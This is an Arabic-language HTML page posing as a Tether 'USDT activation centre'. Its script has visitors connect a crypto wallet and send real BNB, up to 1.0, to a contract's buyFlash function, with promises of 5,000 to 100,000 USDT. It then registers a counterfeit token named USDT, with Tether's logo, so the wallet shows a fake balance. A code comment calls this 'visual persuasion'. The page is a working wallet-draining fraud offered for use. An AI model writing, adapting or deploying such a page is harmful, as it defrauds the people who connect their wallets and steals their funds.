<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether USD | شبكة تفعيل الأصول</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        :root { --tether: #009393; --bg: #050d0c; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: #0a1a18; border: 1px solid #16302c; padding: 40px; border-radius: 25px; text-align: center; width: 380px; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
        .usdt-icon { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 15px var(--tether)); }
        select { background: #111; color: white; border: 1px solid #222; width: 100%; padding: 15px; border-radius: 12px; margin: 20px 0; font-size: 16px; cursor: pointer; }
        .action-btn { background: var(--tether); color: white; border: none; width: 100%; padding: 20px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 18px; transition: 0.4s; }
        .action-btn:hover { background: #00b4b4; transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,147,147,0.4); }
        #log { margin-top: 25px; font-size: 13px; color: #6a8b87; min-height: 20px; }
        .loader { display: none; margin: 10px auto; border: 3px solid #1a3330; border-top: 3px solid var(--tether); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="usdt-icon">
    <h2 style="margin:0">مركز تفعيل USDT</h2>
    <p style="font-size: 14px; color: #7a9a95;">نظام الحقن المباشر عبر شبكة BSC</p>

    <select id="tierSelector">
        <option value="0.0001">اختبار النظام (50 USDT)</option>
        <option value="0.09">تفعيل أساسي (5,000 USDT)</option>
        <option value="0.2">تفعيل متقدم (10,000 USDT)</option>
        <option value="0.5">تفعيل ملكي (50,000 USDT)</option>
        <option value="1.0">تفعيل المؤسسات (100,000 USDT)</option>
    </select>

    <button class="action-btn" id="mainBtn" onclick="processInjection()">تفعيل الرصيد الآن ⚡</button>
    <div class="loader" id="spinner"></div>
    <div id="log">بانتظار ربط المحفظة الآمن...</div>
</div>

<script>
    // تم إدراج عنوان عقدك الجديد هنا بنجاح
    const CONTRACT_ADDR = "0x22581282b507c6743762cBaA542D6B33Cd6f631f";
    const MIN_ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];

    async function processInjection() {
        const log = document.getElementById('log');
        const btn = document.getElementById('mainBtn');
        const loader = document.getElementById('spinner');

        if (typeof window.ethereum === 'undefined') {
            return alert("يرجى فتح الموقع من متصفح محفظة Trust Wallet أو MetaMask");
        }

        try {
            btn.style.display = 'none';
            loader.style.display = 'block';
            log.innerText = "جاري الاتصال بالعقد الذكي...";

            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const web3 = new Web3(window.ethereum);
            const sender = accounts[0];

            // التأكد من الشبكة (BSC)
            const networkId = await web3.eth.getChainId();
            if (networkId !== 56) {
                log.innerText = "يرجى تحويل الشبكة إلى Smart Chain في محفظتك.";
                btn.style.display = 'block'; loader.style.display = 'none';
                return;
            }

            const contract = new web3.eth.Contract(MIN_ABI, CONTRACT_ADDR);
            const bnbAmount = document.getElementById('tierSelector').value;

            log.innerText = "جاري مزامنة سيولة USDT...";

            // تنفيذ المعاملة
            await contract.methods.buyFlash().send({
                from: sender,
                value: web3.utils.toWei(bnbAmount, "ether"),
                gas: 250000,
                gasPrice: await web3.eth.getGasPrice()
            });

            log.innerText = "تم الحقن! جاري تثبيت السعر واللوجو...";

            // إضافة التوكن ببياناته الأصلية لإتمام الإقناع البصري
            await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT_ADDR,
                        symbol: 'USDT',
                        decimals: 18,
                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                    },
                },
            });

            log.innerHTML = "<b style='color:#00ffa3;'>✅ اكتمل التفعيل. الرصيد متاح الآن في محفظتك.</b>";
            loader.style.display = 'none';

        } catch (err) {
            console.error(err);
            log.innerText = "فشل الارتباط: تأكد من تغطية رسوم الغاز.";
            btn.style.display = 'block';
            loader.style.display = 'none';
        }
    }
</script>
</body>
</html>
